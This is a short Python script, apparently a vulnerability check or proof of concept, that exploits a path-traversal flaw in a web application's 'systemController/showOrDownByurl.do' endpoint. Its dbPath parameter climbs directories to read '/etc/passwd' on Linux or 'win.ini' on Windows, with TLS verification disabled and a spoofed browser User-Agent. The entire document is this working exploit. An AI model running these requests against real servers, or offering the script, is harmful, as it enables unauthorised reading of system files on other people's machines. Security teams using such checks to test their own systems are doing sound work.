import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "root:" in response.text:
		linux0=True
	else:
		linux0=False
	url=baseurl+"systemController/showOrDownByurl.do?down=&dbPath=../../../../../Windows/win.ini"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "for 16-bit app support" in response.text:
		windows0=True
	else:
		windows0=False
	if linux0 or windows0:
		return True
	else:
		return False
